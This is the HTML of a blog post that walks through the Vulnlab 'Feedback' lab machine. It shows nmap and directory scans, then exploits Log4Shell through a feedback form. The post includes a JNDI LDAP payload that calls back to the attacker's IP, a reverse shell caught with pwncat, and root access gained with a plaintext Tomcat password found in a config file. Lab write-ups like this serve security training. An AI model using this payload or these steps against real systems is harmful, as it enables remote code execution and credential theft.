@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Vulnlab: Feedback - Journal</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Feedback is an easy linux machine from vulnlabs where we exploit a vulnerable java application. We use exploit a vulnerable version of log4j to get a shell and a hardcoded password to escalate our privileges." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Vulnlab: Feedback" />
+<meta property="og:description" content="Feedback is an easy linux machine from vulnlabs where we exploit a vulnerable java application. We use exploit a vulnerable version of log4j to get a shell and a hardcoded password to escalate our privileges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danp.bz/posts/vulnlab-feedback/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-09-07T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnlab: Feedback"/>
+<meta name="twitter:description" content="Feedback is an easy linux machine from vulnlabs where we exploit a vulnerable java application. We use exploit a vulnerable version of log4j to get a shell and a hardcoded password to escalate our privileges."/>
+<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,500&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://danp.bz/css/main.5a1df495afe53092e2ad0c172adb2250810f442ca165c5f85673cb3b860f3468.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://danp.bz/css/dark.134db564d2aacf16987413a93acdb0fdfe7ada0bd1972f2871066b32c9277a7b.css"  disabled />
+	
+
+	
+	
+
+	
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://danp.bz/">Journal</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/whoami">Whoami</a>
+		
+		<a href="/tags">Tags</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="https://danp.bz/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Vulnlab: Feedback</h1>
+			<div class="meta">Posted on Sep 7, 2023</div>
+		</div>
+		
+
+		<section class="body">
+			<ul>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#directory-fuzzing">Directory Fuzzing</a></li>
+<li><a href="#reverse-shell">Reverse Shell</a></li>
+</ul>
+<h1 id="overview">Overview</h1>
+<ol>
+<li>Fuzz directories to find the <code>feedback</code> app</li>
+<li>Spot that the messages are being logged</li>
+<li>Submit a malicious jdni payload</li>
+<li>Get a reverse shell</li>
+<li>Find the config file with the root user password</li>
+</ol>
+<h1 id="nmap">Nmap</h1>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-feedback » nmap -sV -sC 10.10.90.181                                                                                                                              <span style="color:#0086f7;font-weight:bold">130</span> ↵
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 20:25 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#fb660a;font-weight:bold">for</span> 10.10.90.181
+</span></span><span style="display:flex;"><span>Host is up (0.17s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#0086f7;font-weight:bold">998</span> closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#0086f7;font-weight:bold">2048</span> 39:a1:88:af:a0:27:2b:d0:0e:c7:3c:df:00:e4:5f:3d (RSA)
+</span></span><span style="display:flex;"><span>|   <span style="color:#0086f7;font-weight:bold">256</span> 49:f4:9d:2a:d9:ec:64:72:53:86:07:51:db:59:f4:52 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  <span style="color:#0086f7;font-weight:bold">256</span> 0a:bf:0c:b4:ae:72:35:8f:0e:ee:41:0b:a9:2f:61:a0 (ED25519)
+</span></span><span style="display:flex;"><span>8080/tcp open  http    Apache Tomcat 9.0.56
+</span></span><span style="display:flex;"><span>|_http-favicon: Apache Tomcat
+</span></span><span style="display:flex;"><span>|_http-title: Apache Tomcat/9.0.56
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#fb660a;font-weight:bold">done</span>: <span style="color:#0086f7;font-weight:bold">1</span> IP address (<span style="color:#0086f7;font-weight:bold">1</span> host up) scanned in 38.17 seconds
+</span></span></code></pre></div><ul>
+<li><code>-sV</code>: Enumerate versions</li>
+<li><code>-sC</code>: Run default scripts</li>
+</ul>
+<p>port 8080 shows a tomcat server running.</p>
+<h1 id="directory-fuzzing">Directory Fuzzing</h1>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-feedback » feroxbuster --url http://10.10.90.181:8080/ -w /usr/share/seclists/Discovery/Web-Content/big.txt --no-recursion -s 200,302
+</span></span><span style="display:flex;"><span> ___  ___  __   __     __      __         __   ___
+</span></span><span style="display:flex;"><span>|__  |__  |__) |__) | /  <span style="color:#0086d2">`</span>    /  <span style="color:#0086d2">\ \_</span>/ | |  <span style="color:#0086d2">\ </span>|__
+</span></span><span style="display:flex;"><span>|    |___ |  <span style="color:#0086d2">\ </span>|  <span style="color:#0086d2">\ </span>| <span style="color:#0086d2">\_</span>_,    <span style="color:#0086d2">\_</span>_/ / <span style="color:#0086d2">\ </span>| |__/ |___
+</span></span><span style="display:flex;"><span>by Ben <span style="color:#0086d2">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.0
+</span></span><span style="display:flex;"><span>───────────────────────────┬──────────────────────
+</span></span><span style="display:flex;"><span> 🎯  Target Url            │ http://10.10.90.181:8080/
+</span></span><span style="display:flex;"><span> 🚀  Threads               │ <span style="color:#0086f7;font-weight:bold">50</span>
+</span></span><span style="display:flex;"><span> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span> 👌  Status Codes          │ [200, 302]
+</span></span><span style="display:flex;"><span> 💥  Timeout (secs)        │ <span style="color:#0086f7;font-weight:bold">7</span>
+</span></span><span style="display:flex;"><span> 🦡  User-Agent            │ feroxbuster/2.10.0
+</span></span><span style="display:flex;"><span> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span style="display:flex;"><span> 🔎  Extract Links         │ true
+</span></span><span style="display:flex;"><span> 🏁  HTTP methods          │ [GET]
+</span></span><span style="display:flex;"><span> 🚫  Do Not Recurse        │ true
+</span></span><span style="display:flex;"><span>───────────────────────────┴──────────────────────
+</span></span><span style="display:flex;"><span> 🏁  Press [ENTER] to use the Scan Management Menu™
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">200</span>      GET      354l      787w     5542c http://10.10.90.181:8080/tomcat.css
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">200</span>      GET      174l      906w     6898c http://10.10.90.181:8080/docs/RELEASE-NOTES.txt
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">200</span>      GET      164l     1098w    12551c http://10.10.90.181:8080/docs/setup.html
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">302</span>      GET        0l        0w        0c http://10.10.90.181:8080/docs =&gt; http://10.10.90.181:8080/docs/
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">302</span>      GET        0l        0w        0c http://10.10.90.181:8080/examples =&gt; http://10.10.90.181:8080/examples/
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">302</span>      GET        0l        0w        0c http://10.10.90.181:8080/feedback =&gt; http://10.10.90.181:8080/feedback/
+</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">302</span>      GET        0l        0w        0c http://10.10.90.181:8080/manager =&gt; http://10.10.90.181:8080/manager/
+</span></span><span style="display:flex;"><span>[<span style="color:#080;background-color:#0f140f;font-style:italic">####################] - 72s    20507/20507   0s      found:18      errors:0      </span>
+</span></span><span style="display:flex;"><span>[<span style="color:#080;background-color:#0f140f;font-style:italic">####################] - 72s    20477/20477   285/s   http://10.10.90.181:8080/  </span>
+</span></span></code></pre></div><p>We spot the <code>feedback</code> directory which is not standard. We are received with a feedback form:</p>
+<p><img src="/feedback-img/image.png" alt="Alt text"></p>
+<p>After we submit any message we get</p>
+<p><img src="/feedback-img/image2.png" alt="Alt text"></p>
+<p>It&rsquo;s impossible not to link a java app logging our input with log4shell vulnerability released back in 2021, <em>CVE-2021-44228</em></p>
+<p>In order to validate the vulnerability we can use this handy online <a href="https://log4shell.tools/">tool</a></p>
+<p>We create our payload and submit in both forms:</p>
+<p><img src="/feedback-img/image3.png" alt="Alt text"></p>
+<p>We immediatly get a callback, confirming the vulnerability</p>
+<p><img src="/feedback-img/image4.png" alt="Alt text"></p>
+<h1 id="reverse-shell">Reverse Shell</h1>
+<p>Let&rsquo;s use <a href="https://github.com/kozmer/log4j-shell-poc">this</a> poc to get our shell. Just follow the instructions to install, it&rsquo;s really simple. Once the tool is ready for use we run the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- easy-feedback/log4j-shell-poc ‹main* ?› » python3 poc.py --userip 10.8.0.6 --webport <span style="color:#0086f7;font-weight:bold">8000</span> --lport <span style="color:#0086f7;font-weight:bold">9001</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[!] CVE: CVE-2021-44228
+</span></span><span style="display:flex;"><span>[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+</span></span><span style="display:flex;"><span>[+] Exploit java class created success
+</span></span><span style="display:flex;"><span>[+] Setting up LDAP server
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Send me: <span style="color:#0086d2">${</span><span style="color:#fb660a">jndi</span>:<span style="color:#fb660a">ldap</span>://10.8.0.6:<span style="color:#fb660a">1389</span>/a<span style="color:#0086d2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] Starting Webserver on port <span style="color:#0086f7;font-weight:bold">8000</span> http://0.0.0.0:8000
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+</span></span><span style="display:flex;"><span>Listening on 0.0.0.0:1389
+</span></span></code></pre></div><p>Start a listener on port <code>9001</code> to receive the remote shell and submit the generated payload on the feedback form:</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- easy-feedback/log4j-shell-poc ‹main* ?› » pwncat-cs :9001 
+</span></span><span style="display:flex;"><span>[20:53:15] Welcome to pwncat 🐈! 
+</span></span><span style="display:flex;"><span>[20:54:45] received connection from 10.10.90.181:55708
+</span></span><span style="display:flex;"><span>[20:54:49] 0.0.0.0:9001: upgrading from /bin/dash to /bin/bash
+</span></span><span style="display:flex;"><span>[20:54:51] 10.10.90.181:55708: registered new host w/ db
+</span></span><span style="display:flex;"><span>(local) pwncat$
+</span></span><span style="display:flex;"><span>(remote) tomcat@ip-10-10-10-7:/$ whoami
+</span></span><span style="display:flex;"><span>tomcat
+</span></span><span style="display:flex;"><span>(remote) tomcat@ip-10-10-10-7:/$ 
+</span></span></code></pre></div><p>Sweet! We have a shell!</p>
+<p>Tomcat stores password in plaintext in its config files</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>(remote) tomcat@ip-10-10-10-7:/opt/tomcat/conf$ pwd
+</span></span><span style="display:flex;"><span>/opt/tomcat/conf
+</span></span><span style="display:flex;"><span>(remote) tomcat@ip-10-10-10-7:/opt/tomcat/conf$ cat tomcat-users.xml
+</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#fb660a">version</span>=<span style="color:#0086d2">&#34;1.0&#34;</span> <span style="color:#fb660a">encoding</span>=<span style="color:#0086d2">&#34;UTF-8&#34;</span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;!--
+</span></span><span style="display:flex;"><span>  Licensed to the Apache Software Foundation (ASF) under one or more
+</span></span><span style="display:flex;"><span>  contributor license agreements.  See the NOTICE file distributed with
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  &lt;user <span style="color:#fb660a">username</span>=<span style="color:#0086d2">&#34;admin&#34;</span> <span style="color:#fb660a">password</span>=<span style="color:#0086d2">&#34;H2RR3rGDrbAnPxWa&#34;</span> <span style="color:#fb660a">roles</span>=<span style="color:#0086d2">&#34;manager-gui&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>  &lt;user <span style="color:#fb660a">username</span>=<span style="color:#0086d2">&#34;robot&#34;</span> <span style="color:#fb660a">password</span>=<span style="color:#0086d2">&#34;H2RR3rGDrbAnPxWa&#34;</span> <span style="color:#fb660a">roles</span>=<span style="color:#0086d2">&#34;manager-script&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/tomcat-users&gt;
+</span></span></code></pre></div><p>we see the password for <code>admin</code> and <code>robot</code> users. If we try to <code>su root</code> with this password <code>H2RR3rGDrbAnPxWa</code> we escalate our privileges</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>(remote) tomcat@ip-10-10-10-7:/opt/tomcat/conf$ su root
+</span></span><span style="display:flex;"><span>Password: <span style="color:#080;background-color:#0f140f;font-style:italic">#H2RR3rGDrbAnPxWa</span>
+</span></span><span style="display:flex;"><span>root@ip-10-10-10-7:/opt/tomcat/conf# cat /root/root.txt
+</span></span><span style="display:flex;"><span>VL{25da&lt;snip&gt;51a9}
+</span></span><span style="display:flex;"><span>root@ip-10-10-10-7:/opt/tomcat/conf# 
+</span></span></code></pre></div><p>That&rsquo;s all folks ~</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/vulnlab">vulnlab</a></li>
+					
+					<li><a href="/tags/easy">easy</a></li>
+					
+					<li><a href="/tags/java">java</a></li>
+					
+					<li><a href="/tags/log4shell">log4shell</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/D4n-P" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/dan_ps__" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/danielspatricio/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    Feel free to reach me at any of my social media 🎃
+  </div>
+</footer>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-164145585-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
